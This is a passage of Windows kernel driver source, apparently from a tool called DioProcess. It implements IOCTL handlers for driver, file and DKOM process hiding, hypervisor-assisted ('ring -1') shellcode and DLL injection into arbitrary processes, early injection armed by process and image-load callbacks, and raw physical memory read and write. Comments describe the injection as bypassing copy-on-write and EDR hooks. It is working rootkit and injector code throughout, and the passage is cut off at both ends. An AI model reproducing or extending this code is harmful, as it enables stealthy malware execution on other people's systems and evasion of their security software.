	auto request = (HideDriverRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
	{
		return STATUS_INVALID_PARAMETER;
	}

	request->DriverName[sizeof(request->DriverName) - 1] = '\0';

	if (!HvRemoveHiddenDriver(request->DriverName))
	{
		return STATUS_NOT_FOUND;
	}

	KdPrint((DRIVER_PREFIX "Removed hidden driver: %s\n", request->DriverName));
	return STATUS_SUCCESS;
}

NTSTATUS HandleHvClearHiddenDrivers(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	UNREFERENCED_PARAMETER(Irp);
	UNREFERENCED_PARAMETER(irpSp);
	UNREFERENCED_PARAMETER(info);

	HvClearHiddenDrivers();
	KdPrint((DRIVER_PREFIX "Cleared all hidden drivers\n"));
	return STATUS_SUCCESS;
}

NTSTATUS HandleHvListHiddenDrivers(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

	if (outputLen < sizeof(HiddenDriverListResponse))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto response = (HiddenDriverListResponse*)Irp->AssociatedIrp.SystemBuffer;
	if (!response)
	{
		return STATUS_INVALID_PARAMETER;
	}

	RtlZeroMemory(response, sizeof(HiddenDriverListResponse));

	ULONG returnedCount = 0;
	NTSTATUS status = HvGetHiddenDriverList((char*)response->DriverNames, sizeof(response->DriverNames), &returnedCount);
	response->Count = returnedCount;

	*info = sizeof(HiddenDriverListResponse);

	return status;
}

// ============== Ring -1 Injection Handlers ==============

NTSTATUS HandleHvInjectShellcode(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	KdPrint((DRIVER_PREFIX "Ring -1 shellcode injection request\n"));

	// Validate hypervisor is running
	if (!HvIsHypervisorRunning())
	{
		KdPrint((DRIVER_PREFIX "Hypervisor not running, cannot perform ring -1 injection\n"));
		return STATUS_HV_NOT_PRESENT;
	}

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

	if (inputLen < sizeof(HvInjectShellcodeRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	if (outputLen < sizeof(HvInjectShellcodeResponse))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (HvInjectShellcodeRequest*)Irp->AssociatedIrp.SystemBuffer;
	auto response = (HvInjectShellcodeResponse*)Irp->AssociatedIrp.SystemBuffer;

	if (!request || request->ShellcodeSize == 0)
	{
		return STATUS_INVALID_PARAMETER;
	}

	// Validate buffer size
	SIZE_T expectedSize = FIELD_OFFSET(HvInjectShellcodeRequest, Shellcode) + request->ShellcodeSize;
	if (inputLen < expectedSize)
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	KdPrint((DRIVER_PREFIX "Ring -1 injecting %u bytes into PID %u\n",
		request->ShellcodeSize, request->TargetProcessId));

	NTSTATUS status = STATUS_SUCCESS;
	PVOID allocatedAddress = nullptr;

	// Step 1: Open target process and allocate memory
	PEPROCESS targetProcess = nullptr;
	status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)request->TargetProcessId, &targetProcess);
	if (!NT_SUCCESS(status))
	{
		KdPrint((DRIVER_PREFIX "Failed to lookup process: 0x%X\n", status));
		return status;
	}

	// Attach to target process to allocate memory
	KAPC_STATE apcState;
	KeStackAttachProcess(targetProcess, &apcState);

	SIZE_T regionSize = request->ShellcodeSize;
	status = ZwAllocateVirtualMemory(
		ZwCurrentProcess(),
		&allocatedAddress,
		0,
		&regionSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);

	if (!NT_SUCCESS(status))
	{
		KeUnstackDetachProcess(&apcState);
		ObDereferenceObject(targetProcess);
		KdPrint((DRIVER_PREFIX "Failed to allocate memory: 0x%X\n", status));
		return status;
	}

	KdPrint((DRIVER_PREFIX "Allocated memory at 0x%p in target process\n", allocatedAddress));

	// Touch the memory to page it in - hypervisor needs physical backing
	// This forces the OS to allocate physical pages for the committed memory
	__try
	{
		RtlZeroMemory(allocatedAddress, request->ShellcodeSize);
		KdPrint((DRIVER_PREFIX "Memory paged in successfully\n"));
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		KdPrint((DRIVER_PREFIX "Failed to touch memory: exception\n"));
		SIZE_T freeSize = 0;
		ZwFreeVirtualMemory(ZwCurrentProcess(), &allocatedAddress, &freeSize, MEM_RELEASE);
		KeUnstackDetachProcess(&apcState);
		ObDereferenceObject(targetProcess);
		return STATUS_ACCESS_VIOLATION;
	}

	KeUnstackDetachProcess(&apcState);

	// Step 2: Use hypervisor to write shellcode (ring -1 write)
	// This bypasses all ring 0 protections (copy-on-write, EDR hooks, etc.)
	__try
	{
		ULONG64 bytesWritten = HvInjectShellcode(
			request->TargetProcessId,
			allocatedAddress,
			(PVOID)request->Shellcode,
			request->ShellcodeSize
		);

		KdPrint((DRIVER_PREFIX "Ring -1 write completed: %llu bytes written\n", bytesWritten));

		if (bytesWritten == 0)
		{
			// Fallback: ring -1 write failed (target memory not paged in, etc.)
			// Free the allocated memory
			KeStackAttachProcess(targetProcess, &apcState);
			SIZE_T freeSize = 0;
			ZwFreeVirtualMemory(ZwCurrentProcess(), &allocatedAddress, &freeSize, MEM_RELEASE);
			KeUnstackDetachProcess(&apcState);

			ObDereferenceObject(targetProcess);

			response->Success = FALSE;
			response->AllocatedAddress = 0;
			response->BytesWritten = 0;
			*info = sizeof(HvInjectShellcodeResponse);
			return STATUS_UNSUCCESSFUL;
		}

		// Step 3: Create a remote thread to execute shellcode
		// We still need to use ring 0 for thread creation (no hypercall for this yet)

		// Resolve RtlCreateUserThread
		UNICODE_STRING funcName;
		RtlInitUnicodeString(&funcName, L"RtlCreateUserThread");

		typedef NTSTATUS(NTAPI* RtlCreateUserThread_t)(
			HANDLE ProcessHandle,
			PSECURITY_DESCRIPTOR SecurityDescriptor,
			BOOLEAN CreateSuspended,
			ULONG StackZeroBits,
			PULONG StackReserved,
			PULONG StackCommit,
			PVOID StartAddress,
			PVOID StartParameter,
			PHANDLE ThreadHandle,
			PVOID ClientId
			);

		RtlCreateUserThread_t pfnRtlCreateUserThread =
			(RtlCreateUserThread_t)MmGetSystemRoutineAddress(&funcName);

		if (!pfnRtlCreateUserThread)
		{
			KdPrint((DRIVER_PREFIX "Failed to resolve RtlCreateUserThread\n"));
			ObDereferenceObject(targetProcess);
			response->Success = FALSE;
			response->AllocatedAddress = (ULONG64)allocatedAddress;
			response->BytesWritten = bytesWritten;
			*info = sizeof(HvInjectShellcodeResponse);
			return STATUS_NOT_FOUND;
		}

		// Get a handle to the target process
		HANDLE processHandle = nullptr;
		status = ObOpenObjectByPointer(
			targetProcess,
			OBJ_KERNEL_HANDLE,
			nullptr,
			PROCESS_ALL_ACCESS,
			*PsProcessType,
			KernelMode,
			&processHandle
		);

		if (!NT_SUCCESS(status))
		{
			KdPrint((DRIVER_PREFIX "Failed to get process handle: 0x%X\n", status));
			ObDereferenceObject(targetProcess);
			response->Success = FALSE;
			response->AllocatedAddress = (ULONG64)allocatedAddress;
			response->BytesWritten = bytesWritten;
			*info = sizeof(HvInjectShellcodeResponse);
			return status;
		}

		// Create the thread
		HANDLE threadHandle = nullptr;
		status = pfnRtlCreateUserThread(
			processHandle,
			nullptr,
			FALSE,    // Not suspended
			0,
			nullptr,
			nullptr,
			allocatedAddress,  // Start address = shellcode
			nullptr,           // No parameter
			&threadHandle,
			nullptr
		);

		ZwClose(processHandle);

		if (!NT_SUCCESS(status))
		{
			KdPrint((DRIVER_PREFIX "Failed to create remote thread: 0x%X\n", status));
			ObDereferenceObject(targetProcess);
			response->Success = FALSE;
			response->AllocatedAddress = (ULONG64)allocatedAddress;
			response->BytesWritten = bytesWritten;
			*info = sizeof(HvInjectShellcodeResponse);
			return status;
		}

		ZwClose(threadHandle);
		KdPrint((DRIVER_PREFIX "Ring -1 injection successful!\n"));

		response->Success = TRUE;
		response->AllocatedAddress = (ULONG64)allocatedAddress;
		response->BytesWritten = bytesWritten;
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		KdPrint((DRIVER_PREFIX "Exception during ring -1 injection\n"));
		status = STATUS_UNSUCCESSFUL;
		response->Success = FALSE;
		response->AllocatedAddress = 0;
		response->BytesWritten = 0;
	}

	ObDereferenceObject(targetProcess);
	*info = sizeof(HvInjectShellcodeResponse);
	return status;
}

NTSTATUS HandleHvInjectDll(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	KdPrint((DRIVER_PREFIX "Ring -1 DLL injection request\n"));

	// Validate hypervisor is running
	if (!HvIsHypervisorRunning())
	{
		KdPrint((DRIVER_PREFIX "Hypervisor not running, cannot perform ring -1 injection\n"));
		return STATUS_HV_NOT_PRESENT;
	}

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

	if (inputLen < sizeof(HvInjectDllRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	if (outputLen < sizeof(HvInjectDllResponse))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (HvInjectDllRequest*)Irp->AssociatedIrp.SystemBuffer;
	auto response = (HvInjectDllResponse*)Irp->AssociatedIrp.SystemBuffer;

	if (!request || request->PathLength == 0)
	{
		return STATUS_INVALID_PARAMETER;
	}

	// Validate buffer size
	SIZE_T expectedSize = FIELD_OFFSET(HvInjectDllRequest, DllPath) + request->PathLength;
	if (inputLen < expectedSize)
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	KdPrint((DRIVER_PREFIX "Ring -1 injecting DLL into PID %u, path length %u\n",
		request->TargetProcessId, request->PathLength));

	NTSTATUS status = STATUS_SUCCESS;
	PVOID pathAddress = nullptr;

	// Step 1: Open target process
	PEPROCESS targetProcess = nullptr;
	status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)request->TargetProcessId, &targetProcess);
	if (!NT_SUCCESS(status))
	{
		KdPrint((DRIVER_PREFIX "Failed to lookup process: 0x%X\n", status));
		return status;
	}

	// Step 2: Allocate memory for DLL path in target process
	KAPC_STATE apcState;
	KeStackAttachProcess(targetProcess, &apcState);

	SIZE_T regionSize = request->PathLength;
	status = ZwAllocateVirtualMemory(
		ZwCurrentProcess(),
		&pathAddress,
		0,
		&regionSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE
	);

	if (!NT_SUCCESS(status))
	{
		KeUnstackDetachProcess(&apcState);
		ObDereferenceObject(targetProcess);
		KdPrint((DRIVER_PREFIX "Failed to allocate memory for path: 0x%X\n", status));
		return status;
	}

	// Touch the memory to page it in
	__try
	{
		RtlZeroMemory(pathAddress, request->PathLength);
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		SIZE_T freeSize = 0;
		ZwFreeVirtualMemory(ZwCurrentProcess(), &pathAddress, &freeSize, MEM_RELEASE);
		KeUnstackDetachProcess(&apcState);
		ObDereferenceObject(targetProcess);
		return STATUS_ACCESS_VIOLATION;
	}

	KeUnstackDetachProcess(&apcState);

	KdPrint((DRIVER_PREFIX "Allocated path memory at 0x%p\n", pathAddress));

	// Step 3: Write DLL path via ring -1
	__try
	{
		ULONG64 bytesWritten = HvInjectShellcode(
			request->TargetProcessId,
			pathAddress,
			(PVOID)request->DllPath,
			request->PathLength
		);

		KdPrint((DRIVER_PREFIX "Ring -1 path write: %llu bytes\n", bytesWritten));

		if (bytesWritten == 0)
		{
			KeStackAttachProcess(targetProcess, &apcState);
			SIZE_T freeSize = 0;
			ZwFreeVirtualMemory(ZwCurrentProcess(), &pathAddress, &freeSize, MEM_RELEASE);
			KeUnstackDetachProcess(&apcState);
			ObDereferenceObject(targetProcess);

			response->Success = FALSE;
			response->ModuleBase = 0;
			response->PathAddress = 0;
			*info = sizeof(HvInjectDllResponse);
			return STATUS_UNSUCCESSFUL;
		}

		// Step 4: Find LoadLibraryW in target process using existing helper
		WINDOWS_VERSION windowsVersion = GetWindowsVersion();
		PVOID loadLibraryAddr = GetLoadLibraryWAddress(request->TargetProcessId, windowsVersion);

		if (!loadLibraryAddr)
		{
			KdPrint((DRIVER_PREFIX "Failed to find LoadLibraryW\n"));
			KeStackAttachProcess(targetProcess, &apcState);
			SIZE_T freeSize = 0;
			ZwFreeVirtualMemory(ZwCurrentProcess(), &pathAddress, &freeSize, MEM_RELEASE);
			KeUnstackDetachProcess(&apcState);
			ObDereferenceObject(targetProcess);

			response->Success = FALSE;
			response->ModuleBase = 0;
			response->PathAddress = 0;
			*info = sizeof(HvInjectDllResponse);
			return STATUS_NOT_FOUND;
		}

		// Step 5: Create remote thread to call LoadLibraryW
		UNICODE_STRING funcName;
		RtlInitUnicodeString(&funcName, L"RtlCreateUserThread");

		typedef NTSTATUS(NTAPI* RtlCreateUserThread_t)(
			HANDLE ProcessHandle,
			PSECURITY_DESCRIPTOR SecurityDescriptor,
			BOOLEAN CreateSuspended,
			ULONG StackZeroBits,
			PULONG StackReserved,
			PULONG StackCommit,
			PVOID StartAddress,
			PVOID StartParameter,
			PHANDLE ThreadHandle,
			PVOID ClientId
			);

		RtlCreateUserThread_t pfnRtlCreateUserThread =
			(RtlCreateUserThread_t)MmGetSystemRoutineAddress(&funcName);

		if (!pfnRtlCreateUserThread)
		{
			KdPrint((DRIVER_PREFIX "Failed to resolve RtlCreateUserThread\n"));
			KeStackAttachProcess(targetProcess, &apcState);
			SIZE_T freeSize = 0;
			ZwFreeVirtualMemory(ZwCurrentProcess(), &pathAddress, &freeSize, MEM_RELEASE);
			KeUnstackDetachProcess(&apcState);
			ObDereferenceObject(targetProcess);

			response->Success = FALSE;
			response->ModuleBase = 0;
			response->PathAddress = (ULONG64)pathAddress;
			*info = sizeof(HvInjectDllResponse);
			return STATUS_NOT_FOUND;
		}

		// Get process handle
		HANDLE processHandle = nullptr;
		status = ObOpenObjectByPointer(
			targetProcess,
			OBJ_KERNEL_HANDLE,
			nullptr,
			PROCESS_ALL_ACCESS,
			*PsProcessType,
			KernelMode,
			&processHandle
		);

		if (!NT_SUCCESS(status))
		{
			KdPrint((DRIVER_PREFIX "Failed to get process handle: 0x%X\n", status));
			KeStackAttachProcess(targetProcess, &apcState);
			SIZE_T freeSize = 0;
			ZwFreeVirtualMemory(ZwCurrentProcess(), &pathAddress, &freeSize, MEM_RELEASE);
			KeUnstackDetachProcess(&apcState);
			ObDereferenceObject(targetProcess);

			response->Success = FALSE;
			response->ModuleBase = 0;
			response->PathAddress = (ULONG64)pathAddress;
			*info = sizeof(HvInjectDllResponse);
			return status;
		}

		// Create the thread
		HANDLE threadHandle = nullptr;
		status = pfnRtlCreateUserThread(
			processHandle,
			nullptr,
			FALSE,    // Not suspended
			0,
			nullptr,
			nullptr,
			loadLibraryAddr,   // Start address = LoadLibraryW
			pathAddress,       // Parameter = DLL path
			&threadHandle,
			nullptr
		);

		ZwClose(processHandle);

		if (!NT_SUCCESS(status))
		{
			KdPrint((DRIVER_PREFIX "Failed to create remote thread: 0x%X\n", status));
			KeStackAttachProcess(targetProcess, &apcState);
			SIZE_T freeSize = 0;
			ZwFreeVirtualMemory(ZwCurrentProcess(), &pathAddress, &freeSize, MEM_RELEASE);
			KeUnstackDetachProcess(&apcState);
			ObDereferenceObject(targetProcess);

			response->Success = FALSE;
			response->ModuleBase = 0;
			response->PathAddress = (ULONG64)pathAddress;
			*info = sizeof(HvInjectDllResponse);
			return status;
		}

		ZwClose(threadHandle);
		KdPrint((DRIVER_PREFIX "Ring -1 DLL injection successful!\n"));

		response->Success = TRUE;
		response->ModuleBase = 0;  // We don't wait for the thread to complete
		response->PathAddress = (ULONG64)pathAddress;
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		KdPrint((DRIVER_PREFIX "Exception during ring -1 DLL injection\n"));
		status = STATUS_UNSUCCESSFUL;
		response->Success = FALSE;
		response->ModuleBase = 0;
		response->PathAddress = 0;
	}

	ObDereferenceObject(targetProcess);
	*info = sizeof(HvInjectDllResponse);
	return status;
}

// ============== Early Injection Handlers ==============

NTSTATUS HandleEarlyInjectArm(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	KdPrint((DRIVER_PREFIX "Early injection ARM request\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(EarlyInjectionArmRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (EarlyInjectionArmRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
	{
		return STATUS_INVALID_PARAMETER;
	}

	// Ensure strings are null-terminated
	request->TargetProcessName[MAX_TARGET_PROCESS_NAME - 1] = L'\0';
	request->DllPath[MAX_DLL_PATH_LENGTH - 1] = L'\0';

	KdPrint((DRIVER_PREFIX "Arming early injection: Target=%ws, DLL=%ws, Method=%d, OneShot=%d\n",
		request->TargetProcessName, request->DllPath, request->Method, request->OneShot));

	// Auto-register required callbacks if not already registered
	if (!g_CallbacksRegistered)
	{
		NTSTATUS cbStatus;

		// Register process callback (needed for Trampoline method)
		cbStatus = PsSetCreateProcessNotifyRoutineEx(OnProcessCallback, FALSE);
		if (!NT_SUCCESS(cbStatus))
		{
			KdPrint((DRIVER_PREFIX "Failed to register process callback for early injection (0x%X)\n", cbStatus));
			return cbStatus;
		}
		KdPrint((DRIVER_PREFIX "Process callback registered for early injection\n"));

		// Register image load callback (needed for APC method)
		cbStatus = PsSetLoadImageNotifyRoutine(OnImageLoadCallback);
		if (!NT_SUCCESS(cbStatus))
		{
			KdPrint((DRIVER_PREFIX "Failed to register image load callback for early injection (0x%X)\n", cbStatus));
			// Unregister process callback on failure
			PsSetCreateProcessNotifyRoutineEx(OnProcessCallback, TRUE);
			return cbStatus;
		}
		KdPrint((DRIVER_PREFIX "Image load callback registered for early injection\n"));

		g_CallbacksRegistered = TRUE;
		KdPrint((DRIVER_PREFIX "Callbacks auto-registered for early injection\n"));
	}

	NTSTATUS status = EarlyInjectionArm(
		request->TargetProcessName,
		request->DllPath,
		request->Method,
		request->OneShot
	);

	return status;
}

NTSTATUS HandleEarlyInjectDisarm(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	UNREFERENCED_PARAMETER(Irp);
	UNREFERENCED_PARAMETER(irpSp);

	KdPrint((DRIVER_PREFIX "Early injection DISARM request\n"));

	return EarlyInjectionDisarm();
}

NTSTATUS HandleEarlyInjectStatus(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	KdPrint((DRIVER_PREFIX "Early injection STATUS request\n"));

	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
	if (outputLen < sizeof(EarlyInjectionStatusResponse))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto response = (EarlyInjectionStatusResponse*)Irp->AssociatedIrp.SystemBuffer;
	if (!response)
	{
		return STATUS_INVALID_PARAMETER;
	}

	EarlyInjectionGetStatus(response);

	*info = sizeof(EarlyInjectionStatusResponse);
	return STATUS_SUCCESS;
}

// ============== Kernel Memory Copy (KsDumper-style) ==============

// MmCopyVirtualMemory declaration (undocumented)
extern "C" NTSTATUS NTAPI MmCopyVirtualMemory(
	PEPROCESS SourceProcess,
	PVOID SourceAddress,
	PEPROCESS TargetProcess,
	PVOID TargetAddress,
	SIZE_T BufferSize,
	KPROCESSOR_MODE PreviousMode,
	PSIZE_T ReturnSize
);

NTSTATUS HandleCopyMemory(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	KdPrint((DRIVER_PREFIX "Kernel memory copy request\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

	if (inputLen < sizeof(KernelCopyMemoryRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	if (outputLen < sizeof(KernelCopyMemoryResponse))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (KernelCopyMemoryRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
	{
		return STATUS_INVALID_PARAMETER;
	}

	auto response = (KernelCopyMemoryResponse*)Irp->AssociatedIrp.SystemBuffer;

	// Validate input parameters
	if (request->Size == 0 || request->Size > 64 * 1024 * 1024)  // Max 64MB per request
	{
		KdPrint((DRIVER_PREFIX "Invalid copy size: %u\n", request->Size));
		response->BytesCopied = 0;
		response->Success = FALSE;
		*info = sizeof(KernelCopyMemoryResponse);
		return STATUS_INVALID_PARAMETER;
	}

	// Lookup target process
	PEPROCESS targetProcess = NULL;
	NTSTATUS status = PsLookupProcessByProcessId(
		(HANDLE)(ULONG_PTR)request->TargetProcessId,
		&targetProcess
	);

	if (!NT_SUCCESS(status))
	{
		KdPrint((DRIVER_PREFIX "Failed to lookup process %u: 0x%X\n", request->TargetProcessId, status));
		response->BytesCopied = 0;
		response->Success = FALSE;
		*info = sizeof(KernelCopyMemoryResponse);
		return status;
	}

	// Perform kernel memory copy using MmCopyVirtualMemory
	SIZE_T bytesCopied = 0;
	status = MmCopyVirtualMemory(
		targetProcess,
		(PVOID)request->SourceAddress,
		PsGetCurrentProcess(),
		(PVOID)request->DestinationAddress,
		request->Size,
		UserMode,
		&bytesCopied
	);

	ObDereferenceObject(targetProcess);

	if (NT_SUCCESS(status))
	{
		KdPrint((DRIVER_PREFIX "Memory copy successful: PID %u, Address 0x%llX, Size %u, Copied %llu\n",
			request->TargetProcessId, request->SourceAddress, request->Size, bytesCopied));
		response->BytesCopied = (ULONG)bytesCopied;
		response->Success = TRUE;
	}
	else
	{
		KdPrint((DRIVER_PREFIX "Memory copy failed: 0x%X\n", status));
		response->BytesCopied = 0;
		response->Success = FALSE;
	}

	*info = sizeof(KernelCopyMemoryResponse);
	return status;
}

// ============== File Hiding IOCTL Handlers ==============

NTSTATUS HandleFileHideHide(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	KdPrint((DRIVER_PREFIX "FileHide: Hide request\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(FileHideRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (FileHideRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
	{
		return STATUS_INVALID_PARAMETER;
	}

	// Ensure null-terminated
	request->FilePath[259] = L'\0';

	return FileHide_AddPath(request->FilePath);
}

NTSTATUS HandleFileHideUnhide(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	KdPrint((DRIVER_PREFIX "FileHide: Unhide request\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(FileHideRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (FileHideRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
	{
		return STATUS_INVALID_PARAMETER;
	}

	// Ensure null-terminated
	request->FilePath[259] = L'\0';

	return FileHide_RemovePath(request->FilePath);
}

NTSTATUS HandleFileHideList(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	KdPrint((DRIVER_PREFIX "FileHide: List request\n"));

	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
	if (outputLen < sizeof(FileHideListResponse))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto response = (FileHideListResponse*)Irp->AssociatedIrp.SystemBuffer;
	if (!response)
	{
		return STATUS_INVALID_PARAMETER;
	}

	RtlZeroMemory(response, sizeof(FileHideListResponse));

	NTSTATUS status = FileHide_ListPaths(
		(WCHAR(*)[260])response->Entries,
		&response->Count,
		MAX_FILEHIDE_ENTRIES
	);

	if (NT_SUCCESS(status))
	{
		*info = sizeof(FileHideListResponse);
	}

	return status;
}

// ============== DKOM Process Hiding Handlers ==============

NTSTATUS HandleProcessHide(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(TargetProcessRequest))
		return STATUS_BUFFER_TOO_SMALL;

	auto request = (TargetProcessRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
		return STATUS_INVALID_PARAMETER;

	return ProcessHide_Hide(request->ProcessId);
}

NTSTATUS HandleProcessUnhide(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(TargetProcessRequest))
		return STATUS_BUFFER_TOO_SMALL;

	auto request = (TargetProcessRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
		return STATUS_INVALID_PARAMETER;

	return ProcessHide_Unhide(request->ProcessId);
}

NTSTATUS HandleProcessHideList(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
	if (outputLen < sizeof(ProcessHideListResponse))
		return STATUS_BUFFER_TOO_SMALL;

	auto response = (ProcessHideListResponse*)Irp->AssociatedIrp.SystemBuffer;
	if (!response)
		return STATUS_INVALID_PARAMETER;

	RtlZeroMemory(response, sizeof(ProcessHideListResponse));

	NTSTATUS status = ProcessHide_List(response->Entries, &response->Count, MAX_DKOM_HIDDEN_PROCESSES);

	if (NT_SUCCESS(status))
	{
		*info = sizeof(ProcessHideListResponse);
	}

	return status;
}

// ============== Physical Memory Handlers ==============

NTSTATUS HandleTranslateVA(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	KdPrint(("DioProcess: TranslateVA request\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

	if (inputLen < sizeof(TranslateVaRequest))
		return STATUS_BUFFER_TOO_SMALL;

	if (outputLen < sizeof(TranslateVaResponse))
		return STATUS_BUFFER_TOO_SMALL;

	auto request = (TranslateVaRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
		return STATUS_INVALID_PARAMETER;

	ULONG64 cr3 = PhysMemGetProcessCR3(request->ProcessId);
	if (!cr3)
		return STATUS_NOT_FOUND;

	auto response = (TranslateVaResponse*)Irp->AssociatedIrp.SystemBuffer;
	NTSTATUS status = PhysMemTranslateVA(cr3, request->VirtualAddress, response);

	if (NT_SUCCESS(status))
	{
		*info = sizeof(TranslateVaResponse);
	}

	return status;
}

NTSTATUS HandleReadPhysical(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	KdPrint(("DioProcess: ReadPhysical request\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

	if (inputLen < sizeof(PhysicalMemoryRequest))
		return STATUS_BUFFER_TOO_SMALL;

	if (outputLen < sizeof(PhysicalMemoryResponse))
		return STATUS_BUFFER_TOO_SMALL;

	auto request = (PhysicalMemoryRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
		return STATUS_INVALID_PARAMETER;

	if (request->Size == 0 || request->Size > 4096)
		return STATUS_INVALID_PARAMETER;

	if (!request->BufferAddress)
		return STATUS_INVALID_PARAMETER;

	// Allocate kernel buffer for the read
	PVOID kernelBuf = ExAllocatePoolWithTag(NonPagedPool, request->Size, 'rPhM');
	if (!kernelBuf)
		return STATUS_INSUFFICIENT_RESOURCES;

	SIZE_T bytesRead = 0;
	NTSTATUS status = PhysMemReadPhysical(request->PhysicalAddress, kernelBuf, request->Size, &bytesRead);

	auto response = (PhysicalMemoryResponse*)Irp->AssociatedIrp.SystemBuffer;

	if (NT_SUCCESS(status))
	{
		// Copy to usermode buffer
		__try
		{
			ProbeForWrite((PVOID)request->BufferAddress, request->Size, 1);
			RtlCopyMemory((PVOID)request->BufferAddress, kernelBuf, bytesRead);
			response->BytesTransferred = (ULONG)bytesRead;
			response->Success = 1;
		}
		__except (EXCEPTION_EXECUTE_HANDLER)
		{
			response->BytesTransferred = 0;
			response->Success = 0;
			status = GetExceptionCode();
		}
	}
	else
	{
		response->BytesTransferred = 0;
		response->Success = 0;
	}

	ExFreePoolWithTag(kernelBuf, 'rPhM');
	*info = sizeof(PhysicalMemoryResponse);
	return STATUS_SUCCESS; // Always return success so response is delivered
}

NTSTATUS HandleWritePhysical(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	KdPrint(("DioProcess: WritePhysical request\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

	if (inputLen < sizeof(PhysicalMemoryRequest))
		return STATUS_BUFFER_TOO_SMALL;

	if (outputLen < sizeof(PhysicalMemoryResponse))
		return STATUS_BUFFER_TOO_SMALL;

	auto request = (PhysicalMemoryRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
		return STATUS_INVALID_PARAMETER;

	if (request->Size == 0 || request->Size > 4096)
		return STATUS_INVALID_PARAMETER;

	if (!request->BufferAddress)
		return STATUS_INVALID_PARAMETER;

	// Copy from usermode buffer to kernel buffer first
	PVOID kernelBuf = ExAllocatePoolWithTag(NonPagedPool, request->Size, 'wPhM');
	if (!kernelBuf)
		return STATUS_INSUFFICIENT_RESOURCES;

	__try
	{
		ProbeForRead((PVOID)request->BufferAddress, request->Size, 1);
		RtlCopyMemory(kernelBuf, (PVOID)request->BufferAddress, request->Size);
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		ExFreePoolWithTag(kernelBuf, 'wPhM');
		return GetExceptionCode();
	}

	SIZE_T bytesWritten = 0;
